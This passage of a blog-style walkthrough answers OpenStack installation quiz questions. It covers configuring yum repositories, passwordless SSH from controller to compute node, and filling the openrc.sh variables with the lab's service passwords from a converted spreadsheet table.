<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller ~]# vim /etc/yum.repos.d/http.repo
</span></span></code></pre></td></tr></table>
</div>
</div><p>write the information below into the file:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[centos]
</span></span><span class="line"><span class="cl">name=centos
</span></span><span class="line"><span class="cl">baseurl=http://Resource/centos
</span></span><span class="line"><span class="cl">gpgcheck=0
</span></span><span class="line"><span class="cl">enabled=1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[iaas-repo]
</span></span><span class="line"><span class="cl">name=centos
</span></span><span class="line"><span class="cl">baseurl=http://Resource/iaas
</span></span><span class="line"><span class="cl">gpgcheck=0
</span></span><span class="line"><span class="cl">enabled=1
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then save it, and do the same operation in the <strong>compute</strong> node.</p>
<p>But there&rsquo;s a quick way to use <code>scp</code> to copy the file to it.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller ~]# scp /etc/yum.repos.d/http.repo root@compute:/etc/yum.repos.d/http.repo
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then type the password of the root in compute node, the file will be sent.</p>
<p>And of course, I will use the quick way to do the same executions.</p>
<blockquote>
<h4 id="question-3-configure-ssh-without-keys-05-points"><strong>[Question 3] Configure SSH without keys [0.5 points]</strong></h4>
<p>Configure the <strong>controller node to access the compute node without a key</strong>, and then attempt an SSH connection to the hostname of the compute node for testing. After completion, submit the username, password, and IP address of the controller node in the answer box.</p>
</blockquote>
<p>It&rsquo;s also an easy and necessary operation we have to do, because we can make the <strong>controller node</strong> easier to transfer files and execute commands in <strong>compute node</strong>.</p>
<p>So the first thing we have to do is generate a <code>ssh-key</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller ~]# ssh-keygen
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then press the <kbd>Enter</kbd> to confirm your requirements of generation according to the information in terminal.</p>
<p>Normally you will see these:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Generating public/private rsa key pair.
</span></span><span class="line"><span class="cl">Enter file in which to save the key (/root/.ssh/id_rsa): 
</span></span><span class="line"><span class="cl">Enter passphrase (empty for no passphrase): 
</span></span><span class="line"><span class="cl">Enter same passphrase again: 
</span></span><span class="line"><span class="cl">Your identification has been saved in /root/.ssh/id_rsa
</span></span><span class="line"><span class="cl">Your public key has been saved in /root/.ssh/id_rsa.pub
</span></span><span class="line"><span class="cl">The key fingerprint is:
</span></span><span class="line"><span class="cl">SHA256:FYN98pz53tfocj5Q4DO90jqqN+lJdzXi9WKMFNjm4Wc root@Resource
</span></span><span class="line"><span class="cl">The key&#39;s randomart image is:
</span></span><span class="line"><span class="cl">+---[RSA 3072]----+
</span></span><span class="line"><span class="cl">|         oo      |
</span></span><span class="line"><span class="cl">|        . o=o    |
</span></span><span class="line"><span class="cl">|          o*==   |
</span></span><span class="line"><span class="cl">|         . +Ooo  |
</span></span><span class="line"><span class="cl">|        S   +BE+.|
</span></span><span class="line"><span class="cl">|           .+=*.o|
</span></span><span class="line"><span class="cl">|          ..o*=oo|
</span></span><span class="line"><span class="cl">|         .+o+o=.+|
</span></span><span class="line"><span class="cl">|        .++o *o..|
</span></span><span class="line"><span class="cl">+----[SHA256]-----+
</span></span></code></pre></td></tr></table>
</div>
</div><p>And now it&rsquo;s time to put the key into the <strong>compute node</strong>!</p>
<p>Just simply execute the <code>ssh-copy-id</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller ~]# ssh-copy-id root@compute
</span></span></code></pre></td></tr></table>
</div>
</div><p>And type the password at the last time! You needn&rsquo;t enter the ssh password of the <strong>compute node</strong> anymore!</p>
<p>Then this quiz is solved!</p>
<blockquote>
<h4 id="question-4-basic-installation-05-points"><strong>[Question 4] Basic Installation [0.5 points]</strong></h4>
<p>Install the <code>openstack-iaas</code> package on <em><strong>both</strong></em> the <strong>control node and compute node</strong>, and configure the basic variables in the script files of the two nodes according to Table 2 (the configuration script file is <code>/etc/openstack/openrc.sh</code>).</p>
</blockquote>
<ul>
<li>Table 2 Cloud Platform Configuration Information</li>
</ul>
<html xmlns:v="urn:schemas-microsoft-com:vml"
xmlns:o="urn:schemas-microsoft-com:office:office"
xmlns:x="urn:schemas-microsoft-com:office:excel"
xmlns="http://www.w3.org/TR/REC-html40">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="ProgId" content="Excel.Sheet">
<meta name="Generator" content="Aspose.Cell 22.7.0">
<link rel="File-List" href="工作簿1_files/filelist.xml">
<link rel="Edit-Time-Data" href="工作簿1_files/editdata.mso">
<link rel="OLE-Object-Data" href="工作簿1_files/oledata.mso">
<!--[if gte mso 9]><xml>
 <o:DocumentProperties>
  <o:Revision>1</o:Revision>
  <o:LastSaved>2023-05-05T13:11:27Z</o:LastSaved>
</o:DocumentProperties>
</xml><![endif]-->
<style>
<!--table
 {mso-displayed-decimal-separator:"\.";
 mso-displayed-thousand-separator:"\,";}
@page
 {
 mso-header-data:"";
 mso-footer-data:"";
 margin:0.7519685039370079in 0.7007874015748032in 0.7519685039370079in 0.7007874015748032in;
 mso-header-margin:0.3in;
 mso-footer-margin:0.3in;
 mso-page-orientation:Portrait;
 }
tr
 {mso-height-source:auto;
 mso-ruby-visibility:none;}
col
 {mso-width-source:auto;
 mso-ruby-visibility:none;}
br
 {mso-data-placement:same-cell;}
ruby
 {ruby-align:left;}
.style0
 {
 mso-number-format:General;
 text-align:general;
 vertical-align:bottom;
 white-space:nowrap;
 background:auto;
 mso-pattern:auto;
 color:#000000;
 font-size:11pt;
 font-weight:400;
 font-style:normal;
 font-family:"Calibri","sans-serif";
 mso-protection:locked visible;
 mso-style-name:Normal;
 mso-style-id:0;}
td
 {mso-style-parent:style0;
 mso-number-format:General;
 text-align:general;
 vertical-align:bottom;
 white-space:nowrap;
 background:auto;
 mso-pattern:auto;
 color:#000000;
 font-size:11pt;
 font-weight:400;
 font-style:normal;
 font-family:"Calibri","sans-serif";
 mso-protection:locked visible;
 mso-ignore:padding;}
.x15
 {
 mso-number-format:General;
 text-align:general;
 vertical-align:bottom;
 white-space:nowrap;
 background:auto;
 mso-pattern:auto;
 color:#000000;
 font-size:11pt;
 font-weight:400;
 font-style:normal;
 font-family:"Calibri","sans-serif";
 mso-protection:locked visible;
 }
.x21
 {
 mso-number-format:General;
 text-align:center;
 vertical-align:middle;
 white-space:normal;word-wrap:break-word;
 background:auto;
 mso-pattern:auto;
 font-size:11pt;
 font-weight:400;
 font-style:normal;
 font-family:"微软雅黑","sans-serif";
 border-top:1px solid #000000;
 border-right:1px solid #000000;
 border-bottom:1px solid #000000;
 border-left:1px solid #000000;
 mso-diagonal-down:none;
 mso-diagonal-up:none;
 mso-protection:locked visible;
 }
.x22
 {
 mso-number-format:General;
 text-align:left;
 vertical-align:middle;
 white-space:normal;word-wrap:break-word;
 background:auto;
 mso-pattern:auto;
 font-size:11pt;
 font-weight:400;
 font-style:normal;
 font-family:"微软雅黑","sans-serif";
 border-top:1px solid #000000;
 border-right:1px solid #000000;
 border-bottom:1px solid #000000;
 border-left:1px solid #000000;
 mso-diagonal-down:none;
 mso-diagonal-up:none;
 mso-protection:locked visible;
 }
-->
</style>
<!--[if gte mso 9]><xml>
 <x:ExcelWorkbook>
  <x:ExcelWorksheets>
   <x:ExcelWorksheet>
    <x:Name>Sheet1</x:Name>
<x:WorksheetOptions>
 <x:StandardWidth>2048</x:StandardWidth>
 <x:Print>
  <x:ValidPrinterInfo/>
  <x:PaperSizeIndex>9</x:PaperSizeIndex>
  <x:HorizontalResolution>600</x:HorizontalResolution>
  <x:VerticalResolution>600</x:VerticalResolution>
 </x:Print>
</x:WorksheetOptions>
   </x:ExcelWorksheet>
  </x:ExcelWorksheets>
  <x:WindowHeight>9720</x:WindowHeight>
  <x:WindowWidth>20955</x:WindowWidth>
  <x:WindowTopX>360</x:WindowTopX>
  <x:WindowTopY>15</x:WindowTopY>
  <x:RefModeR1C1/>
  <x:TabRatio>600</x:TabRatio>
  <x:ActiveSheet>0</x:ActiveSheet>
 </x:ExcelWorkbook>
</xml><![endif]-->
</head>
<body link='blue' vlink='purple' >
<table border='0' cellpadding='0' cellspacing='0' width='697' style='border-collapse: 
 collapse;table-layout:fixed;width:522pt'>
 <col width='210' style='mso-width-source:userset;width:157.5pt'>
 <col width='232' style='mso-width-source:userset;width:174pt'>
 <col width='255' style='mso-width-source:userset;width:191.25pt'>
 <tr height='19' style='mso-height-source:use21rset;height:14.25pt'>
<td height='17' class='x21' width='210' style='height:12.75pt;width:157.5pt;'>Service Name</td>
<td class='x21' width='232' style='width:174pt;'>Variable</td>
<td class='x21' width='255' style='width:191.25pt;'>Parameter/Password</td>
 </tr>
 <tr height='19' style='mso-height-source:userset;height:14.25pt'>
<td rowspan='7' height='131' class='x21' style='border-bottom:1px solid #000000;height:98.25pt;'>Mysql</td>
<td class='x21'>root</td>
<td class='x21'>000000</td>
 </tr>
 <tr height='19' style='mso-height-source:userset;height:14.25pt'>
<td class='x21'>Keystone</td>
<td class='x21'>000000</td>
 </tr>
 <tr height='19' style='mso-height-source:userset;height:14.25pt'>
<td class='x21'>Glance</td>
<td class='x21'>000000</td>
 </tr>
 <tr height='19' style='mso-height-source:userset;height:14.25pt'>
<td class='x21'>Nova</td>
<td class='x21'>000000</td>
 </tr>
 <tr height='19' style='mso-height-source:userset;height:14.25pt'>
<td class='x21'>Neutron</td>
<td class='x21'>000000</td>
 </tr>
 <tr height='19' style='mso-height-source:userset;height:14.25pt'>
<td class='x21'>Heat</td>
<td class='x21'>000000</td>
 </tr>
 <tr height='19' style='mso-height-source:userset;height:14.25pt'>
<td class='x21'>Zun</td>
<td class='x21'>000000</td>
 </tr>
 <tr height='19' style='mso-height-source:userset;height:14.25pt'>
<td rowspan='8' height='150' class='x21' style='border-bottom:1px solid #000000;height:112.5pt;'>Keystone</td>
<td class='x21'>DOMAIN_NAME</td>
<td class='x21'>demo</td>
 </tr>
 <tr height='19' style='mso-height-source:userset;height:14.25pt'>
<td class='x21'>Admin</td>
<td class='x21'>000000</td>
 </tr>
 <tr height='19' style='mso-height-source:userset;height:14.25pt'>
<td class='x21'>Rabbit</td>
<td class='x21'>000000</td>
 </tr>
 <tr height='19' style='mso-height-source:userset;height:14.25pt'>
<td class='x21'>Glance</td>
<td class='x21'>000000</td>
 </tr>
 <tr height='19' style='mso-height-source:userset;height:14.25pt'>
<td class='x21'>Nova</td>
<td class='x21'>000000</td>
 </tr>
 <tr height='19' style='mso-height-source:userset;height:14.25pt'>
<td class='x21'>Neutron</td>
<td class='x21'>000000</td>
 </tr>
 <tr height='19' style='mso-height-source:userset;height:14.25pt'>
<td class='x21'>Heat</td>
<td class='x21'>000000</td>
 </tr>
 <tr height='19' style='mso-height-source:userset;height:14.25pt'>
<td class='x21'>Zun</td>
<td class='x21'>000000</td>
 </tr>
 <tr height='19' style='mso-height-source:userset;height:14.25pt'>
<td rowspan='2' height='36' class='x21' style='border-bottom:1px solid #000000;height:27pt;'>Neutron</td>
<td class='x21'>Metadata</td>
<td class='x21'>000000</td>
 </tr>
 <tr height='19' style='mso-height-source:userset;height:14.25pt'>
<td class='x21'>External Network</td>
<td class='x21'>eth1 (depending on actual situation)</td>
 </tr>
<![if supportMisalignedColumns]>
 <tr height='0' style='display:none'>
  <td width='210' style='width:157.5pt;'></td>
  <td width='232' style='width:174pt;'></td>
  <td width='255' style='width:191.25pt;'></td>
 </tr>
 <![endif]>
</table>
</body>
</html>
<p>So according to the Quiz, we have to install the package <code>openstack-iaas</code> at first:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller ~]# yum install -y openstack-iaas 
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@compute ~]# yum install -y openstack-iaas
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then edit the file <code>/etc/openstack/openrc.sh</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller ~]# vim /etc/openstack/openrc.sh
</span></span></code></pre></td></tr></table>
</div>
</div><p>With the information provided by the tables, we can simply write them into it by using <code>vim</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">##--------------------system Config--------------------##
</span></span><span class="line"><span class="cl">##Controller Server Manager IP. example:x.x.x.x
</span></span><span class="line"><span class="cl">#HOST_IP=192.168.56.2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">##Controller HOST Password. example:000000 
</span></span><span class="line"><span class="cl">#HOST_PASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">##Controller Server hostname. example:controller
</span></span><span class="line"><span class="cl">#HOST_NAME=controller
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">##Compute Node Manager IP. example:x.x.x.x
</span></span><span class="line"><span class="cl">#HOST_IP_NODE=192.168.56.3
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">##Compute HOST Password. example:000000 
</span></span><span class="line"><span class="cl">#HOST_PASS_NODE=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">##Compute Node hostname. example:compute
</span></span><span class="line"><span class="cl">#HOST_NAME_NODE=compute
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">##--------------------Chrony Config-------------------##
</span></span><span class="line"><span class="cl">##Controller network segment IP.  example:x.x.0.0/16(x.x.x.0/24)
</span></span><span class="line"><span class="cl">#network_segment_IP=192.168.56.0/24
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">......
</span></span></code></pre></td></tr></table>
</div>
</div><p>But for all the <code>PASS=000000</code> we can operate quickly by using the command.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-vim" data-lang="vim"><span class="line"><span class="cl"><span class="p">:</span>%<span class="nx">s</span><span class="sr">/PASS=/</span><span class="nx">PASS</span><span class="p">=</span><span class="m">000000</span>/<span class="nx">g</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then you will spot that there is a <code>#</code> in each of the front of the variables, we need to execute this <code>vim</code> command to delete the first character:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-vim" data-lang="vim"><span class="line"><span class="cl"><span class="p">:</span>%<span class="nx">s</span><span class="sr">/^.\{1\}/</span>/
</span></span></code></pre></td></tr></table>
</div>
</div><p>Finally, we will get a file like this:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#--------------------system Config--------------------##
</span></span><span class="line"><span class="cl">#Controller Server Manager IP. example:x.x.x.21x
</span></span><span class="line"><span class="cl">HOST_IP=192.168.56.2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#Controller HOST Password. example:000000 
</span></span><span class="line"><span class="cl">HOST_PASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#Controller Server hostname. example:controller
</span></span><span class="line"><span class="cl">HOST_NAME=controller
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#Compute Node Manager IP. example:x.x.x.x
</span></span><span class="line"><span class="cl">HOST_IP_NODE=192.168.56.3
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#Compute HOST Password. example:000000 
</span></span><span class="line"><span class="cl">HOST_PASS_NODE=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#Compute Node hostname. example:compute
</span></span><span class="line"><span class="cl">HOST_NAME_NODE=compute
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#--------------------Chrony Config-------------------##
</span></span><span class="line"><span class="cl">#Controller network segment IP.  example:x.x.0.0/16(x.x.x.0/24)
</span></span><span class="line"><span class="cl">network_segment_IP=192.168.56.0/24
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#--------------------Rabbit Config ------------------##
</span></span><span class="line"><span class="cl">#user for rabbit. example:openstack
</span></span><span class="line"><span class="cl">RABBIT_USER=openstack
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#Password for rabbit user .example:000000
</span></span><span class="line"><span class="cl">RABBIT_PASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#--------------------MySQL Config---------------------##
</span></span><span class="line"><span class="cl">#Password for MySQL root user . exmaple:000000
</span></span><span class="line"><span class="cl">DB_PASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#--------------------Keystone Config------------------##
</span></span><span class="line"><span class="cl">#Password for Keystore admin user. exmaple:000000
</span></span><span class="line"><span class="cl">DOMAIN_NAME=demo
</span></span><span class="line"><span class="cl">ADMIN_PASS=000000
</span></span><span class="line"><span class="cl">DEMO_PASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#Password for Mysql keystore user. exmaple:000000
</span></span><span class="line"><span class="cl">KEYSTONE_DBPASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#--------------------Glance Config--------------------##
</span></span><span class="line"><span class="cl">#Password for Mysql glance user. exmaple:000000
</span></span><span class="line"><span class="cl">GLANCE_DBPASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#Password for Keystore glance user. exmaple:000000
</span></span><span class="line"><span class="cl">GLANCE_PASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#--------------------Placement Config----------------------##
</span></span><span class="line"><span class="cl">#Password for Mysql placement user. exmaple:000000
</span></span><span class="line"><span class="cl">PLACEMENT_DBPASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#Password for Keystore placement user. exmaple:000000
</span></span><span class="line"><span class="cl">PLACEMENT_PASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#--------------------Nova Config----------------------##
</span></span><span class="line"><span class="cl">#Password for Mysql nova user. exmaple:000000
</span></span><span class="line"><span class="cl">NOVA_DBPASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#Password for Keystore nova user. exmaple:000000
</span></span><span class="line"><span class="cl">NOVA_PASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#--------------------Neutron Config-------------------##
</span></span><span class="line"><span class="cl">#Password for Mysql neutron user. exmaple:000000
</span></span><span class="line"><span class="cl">NEUTRON_DBPASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#Password for Keystore neutron user. exmaple:000000
</span></span><span class="line"><span class="cl">NEUTRON_PASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#metadata secret for neutron. exmaple:000000
</span></span><span class="line"><span class="cl">METADATA_SECRET=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#External Network Interface. example:eth1
</span></span><span class="line"><span class="cl">INTERFACE_NAME=enp0s3
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#External Network The Physical Adapter. example:provider
</span></span><span class="line"><span class="cl">Physical_NAME=provider1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#First Vlan ID in VLAN RANGE for VLAN Network. exmaple:101
</span></span><span class="line"><span class="cl">minvlan=101
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#Last Vlan ID in VLAN RANGE for VLAN Network. example:200
</span></span><span class="line"><span class="cl">maxvlan=200
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#--------------------Cinder Config--------------------##
</span></span><span class="line"><span class="cl">#Password for Mysql cinder user. exmaple:000000
</span></span><span class="line"><span class="cl">CINDER_DBPASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#Password for Keystore cinder user. exmaple:000000
</span></span><span class="line"><span class="cl">CINDER_PASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#Cinder Block Disk. example:md126p3
</span></span><span class="line"><span class="cl">BLOCK_DISK=sdb1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#--------------------Swift Config---------------------##
</span></span><span class="line"><span class="cl">#Password for Keystore swift user. exmaple:000000
</span></span><span class="line"><span class="cl">SWIFT_PASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#The NODE Object Disk for Swift. example:md126p4.
</span></span><span class="line"><span class="cl">OBJECT_DISK=sdb2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#The NODE IP for Swift Storage Network. example:x.x.x.x.
</span></span><span class="line"><span class="cl">STORAGE_LOCAL_NET_IP=172.129.1.2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#--------------------Trove Config----------------------##
</span></span><span class="line"><span class="cl">#Password for Mysql trove user. exmaple:000000
</span></span><span class="line"><span class="cl">TROVE_DBPASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#Password for Keystore trove user. exmaple:000000
</span></span><span class="line"><span class="cl">TROVE_PASS=000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#--------------------Heat Config----------------------##
</span></span><span class="line"><span class="cl">#Password for Mysql heat user. exmaple:000000
</span></span><span class="line"><span class="cl">HEAT_DBPASS=000000
</span></span><span class="line"><span class="cl">
